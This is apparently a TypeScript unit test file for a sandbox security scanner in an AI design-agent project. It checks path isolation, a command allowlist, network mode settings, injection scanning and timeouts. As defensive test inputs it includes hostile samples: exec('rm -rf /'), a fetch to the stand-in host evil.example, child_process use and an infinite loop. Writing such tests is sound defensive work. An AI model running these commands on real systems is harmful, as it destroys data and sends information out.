// AKO_studio - Design Agent v1.0.0
// 文件名: tests/unit/security-scanner.test.ts
// 覆盖: L1 路径白/黑名单、命令白名单、L2 网络配置、L4 注入扫描、沙箱执行/超时

import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';

import {
  DEFAULT_FORBIDDEN_PATTERNS,
  SecurityError,
  SecurityScanner,
  type SandboxConfig
} from '../../src/modules/validator/security-scanner';

let tempDir: string;

beforeEach(() => {
  tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'ako-sandbox-'));
});

afterEach(() => {
  fs.rmSync(tempDir, { recursive: true, force: true });
});

function scannerWith(config?: SandboxConfig): SecurityScanner {
  return new SecurityScanner(
    {
      temp_dir: tempDir,
      allowed_paths: [tempDir],
      ...config
    },
    DEFAULT_FORBIDDEN_PATTERNS
  );
}

describe('L1 路径隔离', () => {
  it('沙箱根内 cwd 通过；沙箱根外抛出 OUT_OF_BOUNDS', () => {
    const scanner = scannerWith();
    expect(() => scanner.assertSandboxCwd(tempDir)).not.toThrow();
    expect(() => scanner.assertSandboxCwd(path.join(tempDir, 'sub'))).not.toThrow();
    const outside = path.join(os.tmpdir(), 'ako-outside-root');
    expect(() => scanner.assertSandboxCwd(outside)).toThrow(SecurityError);
    try {
      scanner.assertSandboxCwd(outside);
    } catch (err) {
      expect((err as SecurityError).code).toBe('SANDBOX_PATH_OUT_OF_BOUNDS');
    }
  });

  it('命中禁止前缀抛出 FORBIDDEN_PATH', () => {
    const forbiddenRoot = path.join(tempDir, 'secret');
    fs.mkdirSync(forbiddenRoot, { recursive: true });
    const scanner = scannerWith({ forbidden_paths: [forbiddenRoot] });
    expect(() => scanner.assertSandboxCwd(forbiddenRoot)).toThrow(SecurityError);
    try {
      scanner.assertSandboxCwd(forbiddenRoot);
    } catch (err) {
      expect((err as SecurityError).code).toBe('SANDBOX_FORBIDDEN_PATH');
    }
  });
});

describe('命令白名单（进程执行防护）', () => {
  it('允许 node，拒绝 shell 命令与空命令', () => {
    const scanner = scannerWith();
    expect(() => scanner.validateCommand('node')).not.toThrow();
    expect(() => scanner.validateCommand('')).toThrow(/不能为空/);
    try {
      scanner.validateCommand('bash');
    } catch (err) {
      expect((err as SecurityError).code).toBe('SANDBOX_COMMAND_BLOCKED');
    }
  });

  it('指向沙箱根内的绝对可执行文件放行', () => {
    const exe = path.join(tempDir, 'tool.js');
    fs.writeFileSync(exe, 'console.log(1)', 'utf8');
    const scanner = scannerWith();
    expect(() => scanner.validateCommand(exe)).not.toThrow();
  });
});

describe('L2 网络隔离配置', () => {
  it('restricted 模式缺少 allowed_hosts 在构造期报错', () => {
    expect(() => scannerWith({ network_mode: 'restricted' })).toThrow(SecurityError);
    expect(() => scannerWith({ network_mode: 'restricted', allowed_hosts: ['api.deepseek.com'] })).not.toThrow();
  });

  it('默认 network_mode=none 且会注入运行时标记', async () => {
    const scanner = scannerWith();
    const result = await scanner.runInSandbox('node', [
      '-e',
      'console.log(process.env.AKO_NETWORK_MODE + ":" + process.env.DSH_CREATOR_MODE)'
    ]);
    expect(result.stdout.trim()).toBe('none:readonly');
  });
});

describe('L4 注入扫描', () => {
  it('恶意内容命中多层规则（穿越 / 网络 / 命令执行）', () => {
    const scanner = scannerWith();
    const evil = 'const cp = require("child_process"); cp.exec("rm -rf /"); fetch("https://evil.example"); while(true){}';
    const findings = scanner.scanText(evil);
    const ids = findings.map((f) => f.id);
    expect(ids).toContain('command-exec');
    expect(ids).toContain('network-exfil');
    expect(ids).toContain('resource-abuse');
  });

  it('干净内容无发现', () => {
    const scanner = scannerWith();
    expect(scanner.scanText('生成一个 ReAct 架构方案，无需网络。')).toEqual([]);
  });

  it('assertInputSafe 对高/严重命中抛 INPUT_BLOCKED', () => {
    const scanner = scannerWith();
    expect(() => scanner.assertInputSafe('exec("rm -rf /")')).toThrow(SecurityError);
    try {
      scanner.assertInputSafe('exec("rm -rf /")');
    } catch (err) {
      expect((err as SecurityError).code).toBe('INPUT_BLOCKED');
    }
    expect(() => scanner.assertInputSafe('普通配置内容')).not.toThrow();
  });

  it('可注入自定义规则集合', () => {
    const scanner = new SecurityScanner({ temp_dir: tempDir }, [
      { id: 'custom', layer: 4, severity: 'medium', re: /特殊危险词/g, message: '自定义命中' }
    ]);
    const findings = scanner.scanText('文本中带特殊危险词');
    expect(findings).toHaveLength(1);
    expect(findings[0].id).toBe('custom');
  });
});

describe('沙箱执行（L3 资源限制）', () => {
  it('正常运行返回 stdout/exit_code', async () => {
    const scanner = scannerWith();
    const result = await scanner.runInSandbox('node', ['-e', 'console.log("hi")']);
    expect(result.stdout.trim()).toBe('hi');
    expect(result.exit_code).toBe(0);
    expect(result.timed_out).toBe(false);
  });

  it('超时被 kill 并标记 timed_out', async () => {
    const scanner = scannerWith({ max_cpu_time_ms: 100 });
    const started = Date.now();
    const result = await scanner.runInSandbox('node', [
      '-e',
      'setTimeout(() => console.log("too-late"), 5000)'
    ]);
    expect(result.timed_out).toBe(true);
    expect(Date.now() - started).toBeLessThan(4000);
  });

  it('沙箱外的 cwd 被拒（前置校验）', async () => {
    const scanner = scannerWith();
    await expect(
      scanner.runInSandbox('node', ['-e', 'console.log(1)'], {
        cwd: os.tmpdir()
      })
    ).rejects.toThrow(SecurityError);
  });

  it('启动失败的进程（命令被拒）同样抛错', async () => {
    const scanner = scannerWith({ allowed_commands: ['node'] });
    await expect(
      scanner.runInSandbox('bash', ['-c', 'echo hi'], { cwd: tempDir })
    ).rejects.toThrow(SecurityError);
  });
});
